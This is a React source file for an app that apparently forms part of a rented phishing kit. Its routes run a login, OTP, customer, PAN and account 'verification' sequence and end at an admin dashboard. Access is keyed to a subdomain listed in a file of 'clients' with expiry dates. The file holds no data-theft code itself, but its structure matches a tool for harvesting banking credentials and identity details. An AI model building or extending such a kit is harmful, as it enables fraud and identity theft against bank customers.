import {useEffect, useState} from "react";
import {Switch, Route} from "wouter";
import {QueryClientProvider} from "@tanstack/react-query";
import {queryClient} from "./lib/queryClient";
import {Toaster} from "@/components/ui/toaster";
import LoginPage from "@/pages/LoginPage";
import OtpPage from "@/pages/OtpPage";
import VerifyCustomerPage from "@/pages/VerifyCustomerPage";
import VerifyPanPage from "@/pages/VerifyPanPage";
import VerifyAccountPage from "@/pages/VerifyAccountPage";
import CompletionPage from "@/pages/CompletionPage";
import AdminLoginPage from "@/pages/AdminLoginPage";
import AdminDashboardPage from "@/pages/AdminDashboardPage";
import NotFound from "@/pages/not-found";

const getSubSubdomain = () => {
    const host = window.location.hostname;
    const parts = host.split(".");
    if (parts.length >= 3) {
        return parts[0];
    }
    return null;
};

const useClientValidation = () => {
    const [status, setStatus] = useState({valid: false, loading: true});
    useEffect(() => {
        const subdomain = getSubSubdomain();
        console.log(subdomain);
        fetch(window.location.origin + "/links-data.json")
            .then((res) => res.json())
            .then((data) => {
                console.log("Asd")
                console.log(data)
                const client = data[subdomain];
                if (client?.active) {
                    const now = new Date();
                    const expiry = new Date(client.expires);
                    if (now < expiry) {
                        setStatus({valid: true, loading: false});
                    } else {
                        setStatus({valid: false, loading: false});
                    }
                } else {
                    setStatus({valid: false, loading: false});
                }
            })
            .catch((err) => {
                console.log(err)
                setStatus({valid: false, loading: false});
            });
    }, []);

    return status;
};

function Router() {
    return (
        <Switch>
            <Route path="/" component={LoginPage}/>
            <Route path="/otp" component={OtpPage}/>
            <Route path="/verify-customer" component={VerifyCustomerPage}/>
            <Route path="/verify-pan" component={VerifyPanPage}/>
            <Route path="/verify-account" component={VerifyAccountPage}/>
            <Route path="/completion" component={CompletionPage}/>
            <Route path="/admin" component={AdminLoginPage}/>
            <Route path="/admin/dashboard" component={AdminDashboardPage}/>
            <Route component={NotFound}/>
        </Switch>
    );
}

function App() {
    const {valid, loading} = useClientValidation();
    if (loading) return <div>Loading...</div>;
    if (!valid) return <div>Invalid or Expired Client</div>;

    return (
        <QueryClientProvider client={queryClient}>
            <Router/>
            <Toaster/>
        </QueryClientProvider>
    );
}

export default App;
